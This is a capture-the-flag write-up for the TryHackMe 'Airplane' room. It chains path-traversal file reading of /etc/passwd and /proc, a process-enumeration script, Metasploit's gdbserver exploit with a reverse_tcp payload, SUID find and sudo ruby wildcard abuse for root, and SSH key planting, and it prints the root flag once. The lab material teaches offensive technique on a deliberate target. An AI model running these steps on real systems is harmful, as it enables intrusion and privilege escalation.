---

Name: Airplane
Difficulty: Medium
URL: https://tryhackme.com/room/airplane
Description: Are you ready to fly?

---

# Enumerating open services
First we look at what ports are open on the server

```bash
$ rustscan -a airplane.thm -r 1-65535 --ulimit 5000 -- -sC -sV
Open 10.113.158.243:22
Open 10.113.158.243:6048
Open 10.113.158.243:8000
```

# LFI
While inspecting the website on port 8000 we see it renders the pages using the page parameter
```txt
http://airplane.thm:8000/?page=index.html
```

We test it for LFI, and manage to read the file
```bash
http://airplane.thm:8000/?page=../../../../../etc/passwd
```

```bash
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

# What is the server running?
Using Wappalyzer we see that it is using flask 3.0.2, so we now try to find the app file

First read the process command line:
```bash
http://airplane.thm:8000/?page=../../../../../proc/self/cmdline
```

```bash
$ cat cmdline
/usr/bin/python3    app.py
```

Looking at the status we find the PID, 536
```bash
$ cat status
Name:   python3
Umask:  0022
State:  S (sleeping)
Tgid:   536
Ngid:   0
Pid:    536
PPid:   1
TracerPid:      0
Uid:    1001    1001    1001    1001
Gid:    1001    1001    1001    1001
FDSize: 128
Groups: 1001
NStgid: 536
NSpid:  536
NSpgid: 536
NSsid:  536
VmPeak:  1154404 kB
VmSize:  1056308 kB
VmLck:         0 kB
VmPin:         0 kB
VmHWM:     29440 kB
VmRSS:     29172 kB
RssAnon:           19616 kB
RssFile:            9556 kB
RssShmem:              0 kB
VmData:    52928 kB
VmStk:       132 kB
VmExe:      2772 kB
VmLib:      5156 kB
VmPTE:       208 kB
VmSwap:        0 kB
HugetlbPages:          0 kB
CoreDumping:    0
THP_enabled:    1
Threads:        2
SigQ:   0/3643
SigPnd: 0000000000000000
ShdPnd: 0000000000000000
SigBlk: 0000000000000000
SigIgn: 0000000001001000
SigCgt: 0000000180000002
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
NoNewPrivs:     0
Seccomp:        0
Speculation_Store_Bypass:       vulnerable
Cpus_allowed:   3
Cpus_allowed_list:      0-1
Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
Mems_allowed_list:      0
voluntary_ctxt_switches:        269273
nonvoluntary_ctxt_switches:     11248
```

We can access app.py through the cwd symlink: 
http://airplane.thm:8000/?page=../../../../../proc/536/cwd/app.py
```python
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)


@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')

        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False

            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"]=str(len(resp.get_data()))

            return resp
        
        else:
            return "Page not found"

    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)    


@app.route('/airplane')
def airplane():
    return render_template('airplane.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

```bash
curl 'http://airplane.thm:8000/?page=../../../../../proc/net/tcp' | grep 00000000:17A0
   1: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 20055 1 0000000000000000 100 0 0 10 0

```

# Finding other processes
We can enumearate the processes
```python
import requests

TARGET = "http://airplane.thm:8000"
TRAVERSAL = "../../../../../../../proc/{}/cmdline"

for pid in range(1, 2000):
    url = f"{TARGET}/?page={TRAVERSAL.format(pid)}"

    try:
        r = requests.get(url, timeout=2)

        if len(r.content) > 0:
            cmdline = r.content.replace(b"\x00", b" ").decode(errors="replace")
            
            if "not found" not in cmdline:
                print(f"[+] PID {pid}: {cmdline}")

    except requests.RequestException:
        pass
```

```bash
$ python3 proc_enum.py
[+] PID 1: /sbin/init splash
[+] PID 223: /lib/systemd/systemd-journald
[+] PID 260: /lib/systemd/systemd-udevd
[+] PID 295: /lib/systemd/systemd-networkd
[+] PID 300: /lib/systemd/systemd-timesyncd
[+] PID 306: /lib/systemd/systemd-timesyncd
[+] PID 308: /lib/systemd/systemd-resolved
[+] PID 310: /lib/systemd/systemd-timesyncd
[+] PID 366: /usr/lib/accountsservice/accounts-daemon
[+] PID 367: /usr/sbin/acpid
[+] PID 370: avahi-daemon: running [airplane.local]
[+] PID 372: /usr/sbin/cron -f
[+] PID 374: /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
[+] PID 376: /usr/sbin/NetworkManager --no-daemon
[+] PID 386: /usr/sbin/irqbalance --foreground
[+] PID 387: /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
[+] PID 388: /usr/lib/policykit-1/polkitd --no-debug
[+] PID 390: /usr/sbin/rsyslogd -n -iNONE
[+] PID 392: /usr/lib/snapd/snapd
[+] PID 393: /usr/libexec/switcheroo-control
[+] PID 394: /lib/systemd/systemd-logind
[+] PID 395: /usr/lib/udisks2/udisksd
[+] PID 397: /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
[+] PID 414: /usr/sbin/irqbalance --foreground
[+] PID 415: /usr/lib/accountsservice/accounts-daemon
[+] PID 416: /usr/lib/policykit-1/polkitd --no-debug
[+] PID 420: avahi-daemon: chroot helper
[+] PID 424: /usr/libexec/switcheroo-control
[+] PID 446: /usr/sbin/rsyslogd -n -iNONE
[+] PID 461: /usr/lib/udisks2/udisksd
[+] PID 473: /usr/sbin/cupsd -l
[+] PID 483: /usr/lib/snapd/snapd
[+] PID 484: /usr/lib/accountsservice/accounts-daemon
[+] PID 485: /usr/lib/policykit-1/polkitd --no-debug
[+] PID 486: /usr/lib/udisks2/udisksd
[+] PID 487: /usr/libexec/switcheroo-control
[+] PID 488: /usr/lib/snapd/snapd
[+] PID 502: /usr/sbin/cups-browsed
[+] PID 503: /usr/sbin/ModemManager
[+] PID 524: /usr/sbin/NetworkManager --no-daemon
[+] PID 525: /usr/sbin/NetworkManager --no-daemon
[+] PID 532: /usr/bin/gdbserver 0.0.0.0:6048 airplane
[+] PID 536: /usr/bin/python3 app.py
[+] PID 539: /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
[+] PID 544: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
[+] PID 545: /usr/bin/amazon-ssm-agent
[+] PID 548: /usr/bin/whoopsie -f
[+] PID 554: /opt/airplane
[+] PID 555: /usr/lib/udisks2/udisksd
[+] PID 557: /usr/bin/whoopsie -f
[+] PID 558: /usr/bin/whoopsie -f
[+] PID 559: /usr/sbin/kerneloops --test
[+] PID 561: /usr/sbin/kerneloops
[+] PID 562: /usr/sbin/ModemManager
[+] PID 570: /usr/lib/udisks2/udisksd
[+] PID 574: /usr/sbin/ModemManager
[+] PID 595: /usr/lib/snapd/snapd
[+] PID 604: /usr/bin/amazon-ssm-agent
[+] PID 615: /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
[+] PID 655: /usr/bin/ssm-agent-worker
[+] PID 666: /usr/sbin/gdm3
[+] PID 676: /lib/systemd/systemd --user
[+] PID 677: (sd-pam)
[+] PID 685: /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
[+] PID 690: /usr/libexec/rtkit-daemon
[+] PID 726: gdm-session-worker [pam/gdm-launch-environment]
[+] PID 737: /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
[+] PID 740: /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
[+] PID 741: /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
[+] PID 742: /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/126/gdm/Xauthority -background none -noreset -keeptty -verbose 3
[+] PID 748: /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/126/gdm/Xauthority -background none -noreset -keeptty -verbose 3
[+] PID 749: /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
[+] PID 751: dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
[+] PID 752: dbus-daemon --nofork --print-address 4 --session
[+] PID 753: /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart
```

We find, related to the other open port we found
```bash
PID 532: /usr/bin/gdbserver 0.0.0.0:6048 airplane
```

# Looking for an exploit
Let's search metasploit for an exploit
```bash
$ msfconsole
/ it looks like you're trying to run a \
\ module                               /
 --------------------------------------
 \
  \
     __
    /  \
    |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/


       =[ metasploit v6.4.145-dev-                              ]
+ -- --=[ 2,668 exploits - 1,343 auxiliary - 2,581 payloads     ]
+ -- --=[ 435 post - 57 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search gdbserver

Matching Modules
================

   #  Full Name                          Disclosure Date  Rank   Check  Name
   -  ---------                          ---------------  ----   -----  ----
   0  exploit/multi/gdb/gdb_server_exec  2014-08-24       great  No     GDB Server Remote Payload Execution
   1    \_ target: x86                   .                .      .      .
   2    \_ target: x86_64                .                .      .      .
   3    \_ target: ARMLE                 .                .      .      .
   4    \_ target: AARCH64               .                .      .      .


Interact with a module by name or index. For example info 4, use 4 or use exploit/multi/gdb/gdb_server_exec
After interacting with a module you can manually set a TARGET with set TARGET 'AARCH64'

msf > use 0
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf exploit(multi/gdb/gdb_server_exec) > options

Module options (exploit/multi/gdb/gdb_server_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXE_FILE  /bin/true        no        The exe to spawn when gdbserver is not attached to a process.
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploi
                                        t/basics/using-metasploit.html
   RPORT                      yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.8      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   x86



View the full module info with the info, or info -d command.

msf exploit(multi/gdb/gdb_server_exec) > set RHOSTS airplane.thm
RHOSTS => airplane.thm
msf exploit(multi/gdb/gdb_server_exec) > set RPORT 6048
RPORT => 6048
msf exploit(multi/gdb/gdb_server_exec) >

```

After it failed a couple of times I realized I had to change the exploit target
```bash
$ curl 'http://airplane.thm:8000/?page=../../../../../opt/airplane' --output airplane
$ file airplane
airplane: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3d5c96fba42358a4079103fc8519eb88a913b205, for GNU/Linux 3.2.0, not stripped
```


```bash
msf exploit(multi/gdb/gdb_server_exec) > set target 1
target => 1
msf exploit(multi/gdb/gdb_server_exec) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
    0   x86
=>  1   x86_64
    2   ARMLE
    3   AARCH64


```

# Changing users
Now we have a shell. Enumerating SUID files we find that `find` is one of them
```bash
$ find / -perm -4000 2> /dev/null
/usr/bin/find
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/vmware-user-suid-wrapper
/usr/bin/mount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
```

We can become carlos now using the command from [gtfobins](gtfobins.org/gtfobins/find/#shell) 
```bash
ls -l /usr/bin/find
-rwsr-xr-x 1 carlos carlos 320160 Feb 18  2020 /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit
id
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
whoami
carlos
```

# Connecting with SSH
First we generate the keys
```bash
$ ssh-keygen -t ed25519 -f airplane_carlos
```

Copy the public key and add it in authorized_keys
```bash
$ cat airplane_carlos.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDL5/ZVXT2mLfShaVFRiJ6dC983k8BOkS3Pa+zryrVhu theo@test
```
```bash
$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDL5/ZVXT2mLfShaVFRiJ6dC983k8BOkS3Pa+zryrVhu theo@test' > /home/carlos/.ssh/authorized_keys
$ chmod 600 /home/carlos/.ssh/authorized_keys
```

Now we can connect with the key
```bash
$ ssh -i /tmp/airplane_carlos carlos@airplane.thm
```

# Getting root
Using `sudo -l` we see that we can run any ruby files inside the /root directory, but the wildcard ,`*`, is overly broad, we can use a path such as /root/../tmp/shell.rb
```bash
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb

```

We create the file which spawns a shell in /tmp and use it to gain root access
```bash
carlos@airplane:~$ echo 'exec "/bin/bash -p"' > /tmp/shell.rb
carlos@airplane:~$ sudo /usr/bin/ruby /root/../tmp/shell.rb
root@airplane:/home/carlos# id
uid=0(root) gid=0(root) groups=0(root)
root@airplane:/home/carlos# cat /root/root.txt
190dcbeb688ce5fe029f26a1e5fce002
root@airplane:/home/carlos#
```

Now we can read the flag
```bash
root@airplane:/home/carlos# cat /root/root.txt
REDACTED
```
